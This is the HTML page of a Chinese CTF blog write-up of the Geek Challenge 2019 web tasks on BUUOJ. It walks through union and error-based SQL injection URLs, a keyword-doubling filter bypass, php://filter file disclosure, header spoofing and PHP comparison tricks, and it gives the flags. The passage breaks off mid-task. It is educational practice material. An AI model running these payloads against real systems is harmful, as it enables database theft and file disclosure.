@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="极客大挑战2019前几天开始了 BUUOJ 的刷题之旅（一方面某些原因菜到有点自闭，一方面 adworld 有点不太稳）本来准备按一波顺序写，但是堆堆跟我说起了这个系列题，于是就去刷了一波，感觉还挺好玩。（不愧是一分的水题） Easy SQLSQL Injection 这题一开始给了个登录的画面，本来以为是像之前春秋的公益赛一样，会先登录然后再在里面放注入的地方。但是无奈怎么都登不上去，于是顺手尝">
+<meta property="og:type" content="article">
+<meta property="og:title" content="极客大挑战2019 WriteUp">
+<meta property="og:url" content="https://lemonprefect.cn/zh-CN/posts/50bef630.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="极客大挑战2019前几天开始了 BUUOJ 的刷题之旅（一方面某些原因菜到有点自闭，一方面 adworld 有点不太稳）本来准备按一波顺序写，但是堆堆跟我说起了这个系列题，于是就去刷了一波，感觉还挺好玩。（不愧是一分的水题） Easy SQLSQL Injection 这题一开始给了个登录的画面，本来以为是像之前春秋的公益赛一样，会先登录然后再在里面放注入的地方。但是无奈怎么都登不上去，于是顺手尝">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-02-27T07:14:57.000Z">
+<meta property="article:modified_time" content="2021-04-28T07:48:43.670Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>极客大挑战2019 WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-TW/posts/c2e31117.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-TW/posts/50bef630.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="#">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="/zh-TW/posts/50bef630.html">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/50bef630.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&text=极客大挑战2019 WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&is_video=false&description=极客大挑战2019 WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=极客大挑战2019 WriteUp&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/50bef630.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&name=极客大挑战2019 WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/50bef630.html&t=极客大挑战2019 WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019"><span class="toc-number">1.</span> <span class="toc-text">极客大挑战2019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-SQL"><span class="toc-number">1.1.</span> <span class="toc-text">Easy SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Havefun"><span class="toc-number">1.2.</span> <span class="toc-text">Havefun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secret-File"><span class="toc-number">1.3.</span> <span class="toc-text">Secret File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoveSQL"><span class="toc-number">1.4.</span> <span class="toc-text">LoveSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Http"><span class="toc-number">1.5.</span> <span class="toc-text">Http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySQL"><span class="toc-number">1.6.</span> <span class="toc-text">BabySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HardSQL"><span class="toc-number">1.7.</span> <span class="toc-text">HardSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BuyFlag"><span class="toc-number">1.8.</span> <span class="toc-text">BuyFlag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">1.9.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Knife"><span class="toc-number">1.10.</span> <span class="toc-text">Knife</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload"><span class="toc-number">1.11.</span> <span class="toc-text">Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-ME"><span class="toc-number">1.12.</span> <span class="toc-text">RCE ME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FinalSQL"><span class="toc-number">1.13.</span> <span class="toc-text">FinalSQL</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        极客大挑战2019 WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-02-27T07:14:57.000Z" itemprop="datePublished">2020-02-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="极客大挑战2019"><a href="#极客大挑战2019" class="headerlink" title="极客大挑战2019"></a>极客大挑战2019</h2><p>前几天开始了 BUUOJ 的刷题之旅（一方面某些原因菜到有点自闭，一方面 adworld 有点不太稳）本来准备按一波顺序写，但是<a target="_blank" rel="noopener" href="https://duitutu.cn">堆堆</a>跟我说起了这个系列题，于是就去刷了一波，感觉还挺好玩。（不愧是一分的水题）</p>
+<h3 id="Easy-SQL"><a href="#Easy-SQL" class="headerlink" title="Easy SQL"></a>Easy SQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p>
+<p>这题一开始给了个登录的画面，本来以为是像之前春秋的公益赛一样，会先登录然后再在里面放注入的地方。但是无奈怎么都登不上去，于是顺手尝试了一下。<code>.../check.php?username=999%27%20union%20select%201%2C2%20%23&password=999</code></p>
+<p>没想到这随便试的一手试准了，给了一条白色的回显（前排吐槽界面设计）<code>The used SELECT statements have a different number of columns</code> 。拿到这波提示以后就很容易地试出了数据库的列数，最后的 flag 就一下子出来了 （把背景 block 掉的我差点没看见 flag ，还好看了一手网页源代码）<span class="heimu" title="QAQ">红黑白的三色搭配起来真的不好看</span></p>
+<p>PS 我好像写得太复杂了，其实只要登录上就行。所以应该可以用 <code>' or 1=1 #</code> 啥的直接拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c39d07f5-6b36-4255-b98b-9a66c7144c05&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #641790;color: #fff;font-size: 0.75rem;margin-right: 5px;">POST &amp; GET Trick</span></p>
+<p>这题给了个很萌的网页，观察了一会儿网页上的猫之后，没思路的我看了一手网页源代码。发现了这样一段代码被注释掉了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span> == <span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以顺势给了网页一个参数 <code>cat=dog</code> 之后，flag 就出现在了网页上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a84da6ed-7606-45b4-b97e-12e6d57e8819&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">302</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">PHP 伪协议</span></p>
+<p>一开始看到题目还以为是文件上传啥的，点进去是个红配黑的界面。查看一手源码之后可以跳转两次，但是第二次跳转的时候直接提示“查阅完毕”。反复两次之后发现链接被跳转了，于是猜测中间的 <code>action.php</code> 有点东西。于是上了一手 Python，带上 <code>allow_redirects=False</code> 的参数跑了一波 request，然后成功拿到了夹在跳转中间的 <code>secr3t.php</code>。很骚的是这个页面打开是一段 PHP 代码。（？代码审计）一开始我没管，直接照着提示去了<code>flag.php</code>，然后没有成功拿到 flag。</p>
+<p>推测要从  <code>secr3t.php</code> 这里想办法直接输出 PHP 文件。正好之前看过的视频里面讲到过 <code>filter</code> 和 <code>php://</code>。于是回去仔细看了一手那段 PHP 代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>) || stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>) || stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">	<span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后照着之前的葫芦画了个这样的瓢 <code>.../secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code> 然后成功拿到了一长串 base64 编码。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZjNhOTMxZDAtODU3OS00NGJiLThiODctMjYxODRiYWZmYzlkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>
+
+<p>解码之后是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;我就在这里&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;f3a931d0-8579-44bb-8b87-26184baffc9d&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功拿到 flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f3a931d0-8579-44bb-8b87-26184baffc9d&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p>
+<p>一如既往熟悉的界面，随手输了个 <code>admin' #</code> 就登进去了，但是除了一行字啥也没有 <code>Your password is 'fbc72bd807fe8419b27393707199b18e'</code>。于是退回去试了一波常规操作，构造一个这样的 payload <code>.../check.php?username=nullnull%27%20union%20select%201%2Cgroup_concat(table_name)%2C3%20from%20information_schema.tables%20where%20table_schema=database()%20%23&password=123</code> 成功爆出了表。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello geekuser,l0ve1ysq1！</span><br><span class="line">Your password is &#39;3&#39;</span><br></pre></td></tr></table></figure>
+
+<p>于是继续常规操作，<code>.../check.php?username=nullnull%27%20union%20select%201%2Cgroup_concat(column_name)%2C3%20from%20information_schema.columns%20where%20table_schema=database()%20%23&password=123</code> 成功爆出列。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello id,username,password,id,username,password！</span><br></pre></td></tr></table></figure>
+
+<p>到这里我懵了一会儿，他没有 flag 啥的列，我还以为找错地方了。后来试了试 password 发现我想多了。用 <code>.../check.php?username=nullnull%27%20union%20select%201%2Cgroup_concat(password)%2C3%20from%20l0ve1ysq1%20%23&password=123</code> 成功拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e3d9d46f-a313-45bf-86b8-31b46fa246ce&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span></p>
+<p>这题的网页设计终于好看写了OwO  上来没看到啥，所以就看了一手源码，找到了 <code>Secret.php</code>。直接访问一波，然后跟着各种提示，添加如下 header。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: localhost</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.Sycseret.com</span><br></pre></td></tr></table></figure>
+
+<p>访问之后成功拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39ca0d2c-d886-456e-ad91-98f1bf1fe95c&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p>
+<p>依旧是熟悉的配方，上手拿着上次的 payload 试了一手，发现报错了，然后换了个简单的 <code>.../check.php?username=nullnull%27%20or%201=1%20%23&password=123</code> 依旧报错了。仔细看看报错，发现我语句里的 <code>or</code> 没了。查了一波资料，得知可以双写关键字来绕过过滤。于是试了一手 <code>.../check.php?username=nullnull%27%20oorr%201=1%20%23&password=123</code> 发现登录成功了。于是照着前面的 payload 双写关键字。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;check.php?username&#x3D;nullnull%27%20ununionion%20selselectect%201%2Cgroup_concat(table_name)%2C3%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema&#x3D;database()%20%23&amp;password&#x3D;123</span><br><span class="line"></span><br><span class="line">Hello b4bsql,geekuser！</span><br><span class="line">Your password is &#39;3&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...&#x2F;check.php?username&#x3D;nullnull%27%20ununionion%20selselectect%201%2Cgroup_concat(column_name)%2C3%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema&#x3D;database()%20%23&amp;password&#x3D;123</span><br><span class="line"></span><br><span class="line">Hello id,username,password,id,username,password！</span><br><span class="line">Your password is &#39;3&#39;</span><br></pre></td></tr></table></figure>
+
+<p>最后用 <code>.../check.php?username=nullnull%27%20ununionion%20selselectect%201%2Cgroup_concat(passwoorrd)%2C3%20frfromom%20b4bsql%20%23&password=123</code> 成功拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e53f0586-f83e-4183-8dba-c12dc4a84383&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p>
+<p>这题用老套路上去就被怼“臭弟弟”了，试了一手，发现大部分关键字好像还在，但是空格啥的符号都没了， <code>union</code> 这个关键字也没了。于是就想着走报错注入的思路了。</p>
+<p>一开始疯狂报错（没用的那种），然后去补了一波报错注入的知识点。然后整了个简单的试了试 <code>.../check.php?username=admin%27or(updatexml(1,concat(user(),0x7e,version()),1))%23&password=123</code> 然后发现有了回显 <code>XPATH syntax error: '@localhost~10.3.18-MariaDB'</code>。于是照着整了个爆表的 payload <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=123</code> 成功拿到表 <code>H4rDsq1</code>。</p>
+<p>依照套路，用 <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))%23&password=123</code> 成功拿到列 <code>id,username,password</code>。</p>
+<p>最后，用 <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&password=123</code> 拿到了半个 flag <code>flag&#123;128c8f16-6d62-4b41-b632-ba</code>  （<del>搞人心态成功</del>）</p>
+<p>再次查了一波，用个 <code>right()</code> 拿到了另一半， <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(right(group_concat(password),20))from(H4rDsq1)),0x7e),1))%23&password=123</code>。最后拼接起来，成功拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;128c8f16-6d62-4b41-b632-ba18b718684a&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Cookie</span><span style="padding: 0.25rem 0.375rem;background-color: #641790;color: #fff;font-size: 0.75rem;margin-right: 5px;">POST &amp; GET Trick</span></p>
+<p>这题上来给了个很像 Http 那题的网页，于是就看了一手源码，成功找到入口 <code>pay.php</code>。进去之后依旧没什么头绪——完全没有可以输入的地方。倒是网页本身给了不少提示，于是看了一手源码，发现了一段注释。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>于是构造了一个参数 <code>password=404%250</code> ，POST 过去之后好像没啥反应。其实是它的 Cookie 里还有点东西，把 Cookie 的 <code>user:0</code> 改成 <code>user:1</code> 之后出现了新的提示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">you are Cuiter</span><br><span class="line">Password Right!</span><br><span class="line">Pay for the flag!!!hacker!!!</span><br></pre></td></tr></table></figure>
+
+<p>于是接着构造 POST 的参数 <code>money=1000000000</code> ，结果得到了数字过长的提示 <code>Nember lenth is too long</code> 。到这个地方我突然有点迷了，于是去问了<a target="_blank" rel="noopener" href="https://duitutu.cn">堆堆</a>，结果他说他猜出来这是 strcmp 的漏洞（我真的猜不出），于是构造一波参数 <code>money[]=1</code> 。<span class="HighlightWKT7BlueGreen">这个地方用科学计数法也可以构造，写作 <code>money=1e9</code> ，这样解释更加好一些。</span>（via <a target="_blank" rel="noopener" href="https://duitutu.cn">堆堆</a>）</p>
